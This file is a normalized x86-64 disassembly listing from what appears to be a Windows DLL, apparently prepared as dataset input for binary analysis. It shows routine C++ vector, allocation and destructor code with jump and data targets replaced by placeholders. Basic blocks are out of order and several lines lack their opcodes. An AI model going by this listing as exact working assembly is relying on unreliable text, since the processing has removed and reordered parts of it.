mov [ rsp + 0x50 ] rbp
mov r8 rcx
mov rbp 0x6666666666666667
sub r8 r11
mov rax rbp
imul r8
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
jne r-xdata
mov r10 [ rdi ]
mov [ rsp + 0x48 ] rbx
mov rbx [ rdi + 0x8 ]
mov r9 rbx
mov rax rbp
sub r9 r10
imul r9
mov r9 rdx
sar r9 0x4
mov rax r9
shr rax 0x3f
add r9 rax
cmp r8 r9
ja r-xdata
mov r9 [ rdi + 0x8 ]
mov r8 [ rdi ]
lea rdx [ rsp + 0x40 ]
mov rcx rdi
call sub_180005930
mov rbp [ rsp + 0x50 ]
mov rax rdi
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rdi + 0x10 ]
mov rax rbp
sub rcx r10
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
ja r-xdata
mov rdx rcx
mov r8 r10
mov rcx r11
call sub_180004920
mov r8 [ rdi + 0x8 ]
mov rcx rdi
mov rdx rax
call sub_180002620
mov rcx [ rsi + 0x8 ]
mov rax rbp
sub rcx [ rsi ]
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
mov rax [ rdi ]
lea rcx [ rdx + rdx * 4 ]
lea rcx [ rax + rcx * 8 ]
mov [ rdi + 0x8 ] rcx
jmp r-xdata
test r10 r10
je r-xdata
lea rax [ r9 + r9 * 4 ]
mov r8 r10
mov rcx r11
lea rbx [ r11 + rax * 8 ]
mov rdx rbx
call sub_180004920
movzx eax [ rsp + 0x40 ]
mov r8 [ rdi + 0x8 ]
mov rdx [ rsi + 0x8 ]
mov [ rsp + 0x20 ] al
lea r9 [ rdi + 0x18 ]
mov rcx rbx
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rax rdi
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx [ rsi + 0x8 ]
mov rax rbp
sub rcx [ rsi ]
imul rcx
mov rcx rdi
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
call sub_180001220
test al al
je r-xdata
mov r8 rbx
mov rdx r10
mov rcx rdi
call sub_180002620
mov rcx [ rdi ]
call j_sub_18001c80c
movzx eax [ rsp + 0x40 ]
mov r8 [ rdi ]
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
mov [ rsp + 0x20 ] al
lea r9 [ rdi + 0x18 ]
jmp r-xdata
call sub_180004980
mov [ rdi + 0x8 ] rax
sub_180005ea0
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x80
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x20 ] rbp
movzx esi r8w
mov rbx rdx
mov rbp rcx
xor r12d r12d
mov [ rsp + 0xb0 ] r12d
mov [ rax - 0x70 ] r12d
mov [ rax - 0x68 ] r12
mov [ rax - 0x60 ] r12
mov [ rax - 0x58 ] r12
lea ecx [ r12 + 0x30 ]
call sub_18001c84c
mov [ rsp + 0xa0 ] rax
test rax rax
je r-xdata
mov rdi r12
mov rcx rax
call sub_180008850
mov rdi rax
jmp r-xdata
test rsi rsi
jne r-xdata
mov rcx rdi
call sub_180008890
mov rcx rdi
call j_sub_18001c80c
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800088d0
mov r8d 0x8
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800088c0
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_1800092e0
mov rcx [ rbp + 0x68 ]
mov r9 [ rcx ]
movzx r8d si
mov rdx rax
call [ r9 + 0x10 ]
mov rsi rax
test rdi rdi
je r-xdata
mov rdx rsi
mov rcx [ rbp + 0x50 ]
call sub_18000b550
mov rdi rax
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov [ rbx ] r12d
lea rcx [ rbx + 0x8 ]
lea rdx [ rsp + 0x30 ]
call sub_180002700
nop
jmp r-xdata
mov rcx rsi
call j_sub_18001c80c
test rdi rdi
jne r-xdata
call sub_18001c80c
lea rcx [ rsp + 0x30 ]
call sub_180002680
mov rax rbx
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov r8 [ rdi + 0x20 ]
mov rdx [ rdi + 0x18 ]
lea rcx [ rsp + 0x50 ]
call sub_180009ed0
nop
movzx ecx [ rax ]
mov [ rsp + 0x28 ] cx
movzx ecx [ rax + 0x2 ]
mov [ rsp + 0x2a ] cl
movzx ecx [ rax + 0x3 ]
mov [ rsp + 0x2b ] cl
lea rdx [ rax + 0x8 ]
lea rcx [ rsp + 0x30 ]
call sub_180005cd0
nop
lea rcx [ rsp + 0x58 ]
call sub_180002680
mov rcx [ rdi + 0x18 ]
test rcx rcx
je r-xdata
mov [ rbx ] r12d
lea rcx [ rbx + 0x8 ]
lea rdx [ rsp + 0x30 ]
call sub_180002700
nop
jmp r-xdata
mov rcx rdi
call j_sub_18001c80c
movzx r11d [ rsp + 0x28 ]
mov [ rbx ] r11w
movzx eax [ rsp + 0x2a ]
mov [ rbx + 0x2 ] al
movzx eax [ rsp + 0x2b ]
mov [ rbx + 0x3 ] al
lea rcx [ rbx + 0x8 ]
lea rdx [ rsp + 0x30 ]
call sub_180002700
nop
call sub_18001c80c
sub_180006070
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1f ]
sub rsp 0xa8
mov [ rbp - 0x19 ] 0xfffffffffffffffe
mov rsi rcx
mov rax [ rcx + 0x40 ]
sub rax [ rcx + 0x38 ]
sar rax 0x3
mov [ rbp - 0x21 ] rax
mov r14d 0xe
xor r12d r12d
mov edi r12d
mov [ rbp - 0x59 ] r12
mov ebx r12d
mov [ rbp - 0x51 ] rbx
mov r13d r12d
mov [ rbp - 0x49 ] r12
xor r15b r15b
mov r8 [ rcx + 0x88 ]
mov rcx [ rcx + 0x90 ]
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
je r-xdata
mov rax [ rbp - 0x21 ]
lea rax [ r14 + rax * 2 - 0x1 ]
mov [ rbp - 0x29 ] rax
mov r14d 0x1
mov edx r14d
mov rcx rax
call sub_18001d210
mov r15 rax
test rax rax
jne r-xdata
mov r9d r12d
lea rcx [ rsi - 0x40 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
mov [ r15 ] ax
lea rsi [ r15 + 0x2 ]
mov rcx [ rbp + 0x67 ]
mov eax [ rcx + 0xa8 ]
mov [ rsi ] rax
mov eax [ rcx + 0xac ]
mov [ rsi + 0x4 ] rax
mov eax [ rw-data ]
mov [ rsi + 0x8 ] rax
add rsi 0xc
mov [ rbp + 0x77 ] 0x0
mov r13 rbx
sub r13 rdi
sar r13 0x4
test r13 r13
je r-xdata
cmp rdi rbx
je r-xdata
inc r15b
mov rsi [ rbp + 0x67 ]
mov r8 [ rsi + 0x88 ]
movzx r9d r15b
mov rcx [ rsi + 0x90 ]
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r9 rdx
jae r-xdata
mov rcx [ rbp + 0x7f ]
lea r14 [ r14 + rcx + 0x2 ]
mov ecx 0x10
call sub_18001c84c
test rax rax
je r-xdata
cmp rdi rbx
je r-xdata
mov rax [ rbp - 0x29 ]
lea r14 [ r15 + rax ]
movzx r8d [ rw-data ]
nop [ rax + rax ] ax
test rdi rdi
je r-xdata
movzx r9d [ rbp + 0x67 ]
mov r8 rdi
mov rdx rbx
mov rcx rbx
call sub_1800043a0
mov r12 rax
cmp rax rbx
je r-xdata
jmp r-xdata
mov rax r12
mov rcx [ rbp + 0x7f ]
mov [ rax ] rsi
mov [ rax + 0x8 ] rcx
jmp r-xdata
movzx eax [ rw-data ]
mov [ rsi ] al
inc rsi
mov r13b 0x1
cmp [ rbp - 0x21 ] 0x1
jbe r-xdata
movzx r9d [ rbp + 0x67 ]
mov r8 rdi
mov rdx rbx
mov rcx rbx
call sub_1800043a0
mov r13 rax
cmp rax rbx
je r-xdata
mov r14d 0x1
mov [ rsi ] r8b
inc rsi
mov rdx [ rdi + r12 * 8 ]
mov r9 [ rdx + 0x8 ]
mov r8 [ rdx ]
mov rdx r9
mov rcx rsi
call sub_18001d25c
mov r11 [ rdi + r12 * 8 ]
add rsi [ r11 + 0x8 ]
movzx r8d [ rw-data ]
mov [ rsi ] r8b
inc rsi
movzx edx [ rbp + 0x77 ]
inc dl
mov [ rbp + 0x77 ] dl
movzx r12d dl
cmp r12 r13
jb r-xdata
xor al al
jmp r-xdata
cmp rdi rbx
je r-xdata
mov rbx r12
mov [ rbp - 0x51 ] rbx
lea rsi [ rax + 0x8 ]
mov [ rbp + 0x7f ] r12
lea rcx [ r9 + r9 * 4 ]
movzx eax [ r8 + rcx * 8 ]
mov [ rbp - 0x11 ] ax
movzx eax [ r8 + rcx * 8 + 0x2 ]
mov [ rbp - 0xf ] al
movzx eax [ r8 + rcx * 8 + 0x3 ]
mov [ rbp - 0xe ] al
lea rdx [ r8 + rcx * 8 + 0x8 ]
lea rcx [ rbp - 0x9 ]
call sub_180002700
lea rdx [ rbp + 0x7f ]
lea rcx [ rbp - 0x11 ]
call sub_1800099d0
mov rsi rax
test rax rax
je r-xdata
cmp rbx r13
jne r-xdata
lea rax [ rbp - 0x39 ]
cmp rdi rax
ja r-xdata
mov [ rbp - 0x39 ] r12
mov [ rbp - 0x31 ] r12
mov rdx rax
lea rcx [ rbp - 0x39 ]
call sub_1800037e0
nop
lea rax [ rbp - 0x39 ]
cmp rax rbx
jae r-xdata
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] 0x1
mov r9d [ rbp + 0x6f ]
mov r8 [ rbp - 0x29 ]
mov rdx r15
mov rax [ rbp + 0x67 ]
lea rcx [ rax - 0x40 ]
call sub_1800045e0
nop
test rdi rdi
je r-xdata
lea r12 [ rsi + 0x2 ]
mov rdi [ rbp - 0x29 ]
mov rbx [ rbp + 0x67 ]
nop [ rax + rax ] ax
mov rbx r13
mov [ rbp - 0x51 ] rbx
lea r12 [ rax + 0x8 ]
add r12 r12
mov rax [ rdi + r12 * 8 ]
mov rcx [ rax + 0x8 ]
lea rax [ rsi + rcx ]
cmp rax r14
ja r-xdata
add rsp 0xa8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx rdi
call j_sub_18001c80c
lea rsi [ rdi + 0x8 ]
add rsi 0x10
lea rax [ rsi - 0x8 ]
cmp rax rbx
jne r-xdata
[ rdi + 0x8 ]
jne r-xdata
test rbx rbx
je r-xdata
mov rcx rbx
sub rcx rdi
sar rcx 0x4
mov rax 0xffffffffffffffe
cmp rcx rax
ja r-xdata
lea rsi [ rbp - 0x39 ]
sub rsi rdi
cmp rbx r13
jne r-xdata
mov al 0x1
cmp rdi rbx
je r-xdata
inc r13b
movzx r14d r13b
cmp r14 [ rbp - 0x21 ]
jb r-xdata
lea rcx [ r15 + rdi ]
cmp r12 rcx
ja r-xdata
add r12 0x10
lea rax [ r12 - 0x8 ]
cmp rax rbx
jne r-xdata
[ rdi + 0x8 ]
jne r-xdata
add rsi 0x10
lea rax [ rsi - 0x8 ]
cmp rax rbx
jne r-xdata
[ rdi + 0x8 ]
jne r-xdata
mov rdi [ rsi ]
test rdi rdi
je r-xdata
mov rdi [ rbp - 0x59 ]
mov rbx [ rbp - 0x51 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rdx [ rbp - 0x31 ]
mov [ rbx ] r12
mov [ rbx + 0x8 ] r12
lea rax [ rbp - 0x39 ]
cmp rbx rax
je r-xdata
lea rcx [ r--data ]
call sub_18001c17c
inc rcx
mov rdx r13
sub rdx rdi
sar rdx 0x4
cmp rcx rdx
jbe r-xdata
and rsi 0xfffffffffffffff0
add rsi rdi
test rbx rbx
je r-xdata
mov rcx rbx
sub rcx rdi
sar rcx 0x4
mov rax 0xffffffffffffffe
cmp rcx rax
ja r-xdata
mov rcx rdi
call j_sub_18001c80c
lea rsi [ rdi + 0x8 ]
nop [ rax ] eax
mov rax [ rbx + 0x38 ]
mov rcx [ rax + r14 * 8 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
test ax ax
je r-xdata
mov rbx [ rbp - 0x51 ]
mov rdi [ rbp - 0x59 ]
mov [ rsi ] ax
add rsi 0x2
add r12 0x2
mov rdi [ r12 ]
test rdi rdi
je r-xdata
mov rdi [ rbp - 0x59 ]
mov rbx [ rbp - 0x51 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rdi [ rsi ]
test rdi rdi
je r-xdata
mov rdi [ rbp - 0x59 ]
mov rbx [ rbp - 0x51 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
[ rdx + 0x8 ]
jne r-xdata
mov rdx r12
mov rax [ rbp - 0x31 ]
mov [ rbx + 0x8 ] rax
mov [ rbp - 0x31 ] rdx
mov rcx [ rbx ]
mov rax [ rbp - 0x39 ]
mov [ rbx ] rax
mov [ rbp - 0x39 ] rcx
jmp r-xdata
mov r8 rdx
shr r8 0x1
mov rax 0xfffffffffffffff
sub rax r8
cmp rax rdx
jae r-xdata
mov [ rbx ] r12
mov [ rbx + 0x8 ] r12
cmp rbx rsi
je r-xdata
lea rcx [ r--data ]
call sub_18001c17c
inc rcx
mov rdx r13
sub rdx rdi
sar rdx 0x4
cmp rcx rdx
jbe r-xdata
add rsi 0x10
lea rax [ rsi - 0x8 ]
cmp rax rbx
jne r-xdata
[ rdi + 0x8 ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
mov rdi [ rbp - 0x59 ]
mov rbx [ rbp - 0x51 ]
mov r13 [ rbp - 0x49 ]
mov rbx [ rbp - 0x31 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
add rbx 0x10
mov [ rbp - 0x51 ] rbx
test rdx rdx
je r-xdata
add rdx r8
mov rdx r12
jmp r-xdata
mov rax [ rsi + 0x8 ]
mov [ rbx + 0x8 ] rax
mov [ rsi + 0x8 ] r12
mov rcx [ rbx ]
mov rax [ rsi ]
mov [ rbx ] rax
mov [ rsi ] rcx
jmp r-xdata
mov r8 rdx
shr r8 0x1
mov rax 0xfffffffffffffff
sub rax r8
cmp rax rdx
jae r-xdata
mov rdi [ rsi ]
test rdi rdi
je r-xdata
mov rdi [ rbp - 0x59 ]
mov rbx [ rbp - 0x51 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rcx [ rbp - 0x31 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
cmp rdx rcx
cmovb rdx rcx
lea rcx [ rbp - 0x59 ]
call sub_180005a10
mov r13 [ rbp - 0x49 ]
mov rbx [ rbp - 0x51 ]
mov rdi [ rbp - 0x59 ]
add rdx r8
mov rdx r12
jmp r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
cmp rdx rcx
cmovb rdx rcx
lea rcx [ rbp - 0x59 ]
call sub_180005a10
mov r13 [ rbp - 0x49 ]
mov rbx [ rbp - 0x51 ]
mov rdi [ rbp - 0x59 ]
sub_1800066a0
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
mov rax rbx
add rsp 0x30
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x60 ] rbx
add rdi 0x28
jmp r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
movzx eax [ rdi + 0x2 ]
mov [ rbx + 0x2 ] al
movzx eax [ rdi + 0x3 ]
mov [ rbx + 0x3 ] al
lea rdx [ rdi + 0x8 ]
lea rcx [ rbx + 0x8 ]
call sub_180002700
nop
cmp rdi rsi
je r-xdata
sub_180006710
cmp rcx rdx
je r-xdata
retn
push rbp
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x40 ] rdi
mov [ rsp + 0x48 ] r12
mov rbp rdx
lea rdi [ rcx + 0x8 ]
xor r12d r12d
nop [ rax ] eax
mov [ rdi ] r12
mov [ rdi + 0x8 ] r12
mov [ rdi + 0x10 ] r12
add rdi 0x28
lea rax [ rdi - 0x8 ]
cmp rax rbp
jne r-xdata
mov rsi [ rdi + 0x8 ]
cmp rbx rsi
je r-xdata
mov rbx [ rdi ]
test rbx rbx
je r-xdata
mov r12 [ rsp + 0x48 ]
mov rdi [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rbp
mov rcx [ rdi ]
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
sub_1800067c0
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] rsi
mov rdi rdx
mov rbx rcx
mov rax 0x666666666666666
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rbx ]
mov r13 0x6666666666666667
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rdi
retn
mov rdx rdi
lea rcx [ rbx + 0x18 ]
call sub_1800031a0
mov rsi rax
mov [ rsp + 0x68 ] rax
movzx eax [ rsp + 0x68 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] 0x0
lea r9 [ rbx + 0x18 ]
mov r8 rsi
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
call sub_1800066a0
nop
mov r11 [ rbx + 0x8 ]
mov r10 [ rbx ]
mov rcx r11
sub rcx r10
mov rax r13
imul rcx
mov r13 rdx
sar r13 0x4
mov rax r13
shr rax 0x3f
add r13 rax
test r10 r10
je r-xdata
lea rax [ rdi + rdi * 4 ]
lea rcx [ rsi + rax * 8 ]
mov [ rbx + 0x10 ] rcx
lea rax [ r13 + r13 * 4 ]
lea rcx [ rsi + rax * 8 ]
mov [ rbx + 0x8 ] rcx
mov [ rbx ] rsi
movzx r9d [ rsp + 0x68 ]
lea r8 [ rbx + 0x18 ]
mov rdx r11
mov rcx r10
call sub_180006710
mov rcx [ rbx ]
call j_sub_18001c80c
sub_1800068e0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
movzx r9d [ rsp + 0x30 ]
mov rdx [ rbx + 0x8 ]
lea r8 [ rbx + 0x18 ]
call sub_180006710
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180006920
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push r12
sub rsp 0x20
mov rbp [ rcx + 0x8 ]
lea rbx [ r8 + 0x28 ]
mov r12 rdx
mov rsi rcx
cmp rbx rbp
je r-xdata
mov rdx [ rsi + 0x8 ]
movzx r9d [ rsp + 0x50 ]
lea r8 [ rsi + 0x18 ]
lea rcx [ rdx - 0x28 ]
call sub_180006710
mov rax [ rsp + 0x50 ]
add [ rsi + 0x8 ] 0xffffffffffffffd8
mov rbx [ rsp + 0x48 ]
mov [ r12 ] rax
mov rax r12
add rsp 0x20
pop r12
pop rsi
pop rbp
retn
mov [ rsp + 0x40 ] rdi
lea rdi [ r8 + 0x3 ]
nop
movzx eax [ rbx ]
lea rdx [ rbx + 0x8 ]
lea rcx [ rdi + 0x5 ]
mov [ rdi - 0x3 ] ax
movzx eax [ rbx + 0x2 ]
mov [ rdi - 0x1 ] al
movzx eax [ rbx + 0x3 ]
mov [ rdi ] al
call sub_180005cd0
add rbx 0x28
add rdi 0x28
cmp rbx rbp
jne r-xdata
mov rdi [ rsp + 0x40 ]
sub_1800069c0
push rdi
sub rsp 0x20
mov r8 [ rcx + 0x8 ]
mov r11 rdx
mov rdi 0x6666666666666667
sub r8 [ rcx ]
mov rax rdi
mov r9 0x666666666666666
mov r10 rcx
imul r8
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax r9
sub rax r11
cmp rax r8
jae r-xdata
mov rcx [ rcx + 0x10 ]
mov rax rdi
add r8 r11
sub rcx [ r10 ]
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
add rsp 0x20
pop rdi
retn
mov rax rdx
shr rax 0x1
sub r9 rax
cmp r9 rdx
jae r-xdata
add rdx rax
xor edx edx
jmp r-xdata
cmp rdx r8
mov rcx r10
cmovb rdx r8
call sub_1800067c0
sub_180006a70
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xd0
mov [ rbp - 0x51 ] 0xfffffffffffffffe
mov [ rsp + 0x120 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
mov r13 rdx
mov rbx rcx
mov [ rbp - 0x59 ] rcx
lea rax [ r--data ]
mov [ rcx ] rax
add rcx 0x10
lea rdx [ rbp - 0x79 ]
call sub_180001960
xor r15d r15d
mov [ rbx + 0x8 ] r15d
lea rax [ r--data ]
mov [ rbx ] rax
lea rax [ r--data ]
mov [ rbx + 0x40 ] rax
mov [ rbx + 0x78 ] r15
mov [ rbx + 0x80 ] r15
mov [ rbx + 0x88 ] r15
mov [ rbx + 0xa0 ] r15
mov [ rbx + 0xa8 ] r15
mov [ rbx + 0xb0 ] r15
mov [ rbx + 0xc8 ] r15
mov [ rbx + 0xd0 ] r15
mov [ rbx + 0xd8 ] r15
lea ecx [ r15 + 0x30 ]
call sub_18001c84c
mov [ rbp - 0x71 ] rax
test rax rax
je r-xdata
mov rsi r15
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
lea r8d [ r15 + 0x3e ]
lea rdx [ rw-data ]
mov rcx rax
call sub_180008860
mov rsi rax
jmp r-xdata
mov rax r15
movups xmm0 [ rw-data ]
movaps [ rbp - 0x69 ] xmm0
lea r9 [ rbp - 0x69 ]
mov r8 r12
mov rdx r13
mov rcx rax
call sub_18000e4f0
jmp r-xdata
mov rcx rsi
call j_sub_1800088e0
mov r12 rax
mov ecx 0xe8
call sub_18001c84c
mov [ rbp - 0x71 ] rax
test rax rax
je r-xdata
mov rax [ rbx + 0x58 ]
test rax rax
lea rcx [ rax + 0x8 ]
jne r-xdata
mov rcx rsi
call sub_180008890
mov rcx rsi
call j_sub_18001c80c
mov [ rbx + 0x58 ] rax
mov rcx r12
call sub_18001c80c
test rsi rsi
je r-xdata
mov [ rbx + 0x60 ] rcx
mov [ rbx + 0x68 ] rax
mov ecx 0x30
call sub_18001c84c
mov [ rbp - 0x71 ] rax
test rax rax
je r-xdata
mov rcx r15
mov rsi r15
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
mov r8d 0x32
lea rdx [ rw-data ]
mov rcx rax
call sub_180008860
mov rsi rax
jmp r-xdata
mov rax [ r11 ]
mov [ rbp - 0x21 ] rax
mov rax [ r11 + 0x8 ]
mov [ rbp - 0x19 ] rax
mov rax [ r11 + 0x10 ]
mov [ rbp - 0x11 ] rax
mov rax [ r11 + 0x18 ]
mov [ rbp - 0x9 ] rax
mov rax [ r11 + 0x20 ]
mov [ rbp - 0x1 ] rax
mov rax [ r11 + 0x28 ]
mov [ rbp + 0x7 ] rax
movzx eax [ r11 + 0x30 ]
mov [ rbp + 0xf ] ax
cmp [ rbp - 0x31 ] 0x10
jb r-xdata
mov r11 [ rax ]
mov [ rbp - 0x21 ] 0x0
xor eax eax
mov [ rbp - 0x20 ] rax
mov [ rbp - 0x18 ] rax
mov [ rbp - 0x10 ] rax
mov [ rbp - 0x8 ] rax
mov [ rbp ] rax
mov [ rbp + 0x8 ] rax
mov [ rbp + 0x10 ] al
lea rdx [ rbp - 0x49 ]
mov rcx rsi
call sub_180009450
mov r11 rax
cmp [ rax + 0x18 ] 0x10
jb r-xdata
test rsi rsi
je r-xdata
mov rcx [ rbp - 0x49 ]
call j_sub_18001c80c
mov ecx 0x20
call sub_18001c84c
mov [ rbp - 0x71 ] rax
test rax rax
je r-xdata
mov rcx rsi
call sub_180008890
mov rcx rsi
call j_sub_18001c80c
mov rax r15
mov r8d 0x32
lea rdx [ rbp - 0x21 ]
mov rcx rax
call sub_18000b560
jmp r-xdata
mov rax r15
lea rdx [ rbx + 0x40 ]
mov rcx rax
call sub_180002520
jmp r-xdata
mov [ rbx + 0x50 ] rax
mov [ rbx + 0x98 ] 0xff
mov ecx 0x78
call sub_18001c84c
mov [ rbp - 0x71 ] rax
test rax rax
je r-xdata
mov rax r15
mov rcx rax
call sub_18000f260
jmp r-xdata
mov [ rbx + 0x48 ] rax
mov ecx 0x10
call sub_18001c84c
mov [ rbp - 0x71 ] rax
test rax rax
je r-xdata
mov rax [ rbx + 0x80 ]
test rax rax
je r-xdata
mov edx 0x1
lea rcx [ rbx + 0x78 ]
call sub_180003cb0
mov [ rbx + 0x70 ] rax
mov eax [ rw-data ]
mov [ rbx + 0xe8 ] eax
mov eax [ rw-data ]
mov [ rbx + 0xec ] eax
mov [ rbx + 0xf0 ] 0x0
movzx eax [ rw-data ]
mov [ rbx + 0x8 ] ax
mov rsi [ rbx + 0x78 ]
sub rsi rsi
sar rsi 0x3
mov rax [ rbx + 0x88 ]
cmp [ rbx + 0x80 ] rax
jne r-xdata
add [ rbx + 0x80 ] 0x8
mov r8 [ rbx + 0x80 ]
lea rdx [ r8 - 0x8 ]
mov rcx [ rbx + 0x78 ]
lea rcx [ rcx + rsi * 8 ]
cmp rcx rdx
je r-xdata
mov [ rax ] rbx
mov rax rbx
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x120 ]
add rsp 0xd0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp rdx r8
je r-xdata
jmp r-xdata
mov [ rsp + 0x20 ] r15
xor r9d r9d
call sub_180003530
nop
jmp r-xdata
sub_180006df0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x40 ] rax
mov rcx [ rcx + 0x70 ]
test rcx rcx
je r-xdata
mov rdi [ rbx + 0x48 ]
test rdi rdi
je r-xdata
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
mov rdi [ rbx + 0x50 ]
test rdi rdi
je r-xdata
mov rcx rdi
call sub_1800020d0
mov rcx rdi
call j_sub_18001c80c
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
mov rcx rdi
call sub_18000b260
mov rcx rdi
call j_sub_18001c80c
mov rcx [ rbx + 0xc8 ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
nop
xor edi edi
mov [ rbx + 0xc8 ] rdi
mov [ rbx + 0xd0 ] rdi
mov [ rbx + 0xd8 ] rdi
mov rcx [ rbx + 0xa0 ]
test rcx rcx
je r-xdata
lea r8 [ rbx + 0xe0 ]
movzx r9d [ rsp + 0x40 ]
mov rdx [ rbx + 0xd0 ]
call sub_180006710
mov rcx [ rbx + 0xc8 ]
call j_sub_18001c80c
mov [ rbx + 0xa0 ] rdi
mov [ rbx + 0xa8 ] rdi
mov [ rbx + 0xb0 ] rdi
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call j_sub_18001c80c
mov [ rbx + 0x78 ] rdi
mov [ rbx + 0x80 ] rdi
mov [ rbx + 0x88 ] rdi
lea rax [ r--data ]
mov [ rbx ] rax
add rbx 0x10
mov [ rsp + 0x40 ] rbx
mov rcx rbx
call sub_180004840
nop
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx ] rdi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
call j_sub_18001c80c
sub_180006f40
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
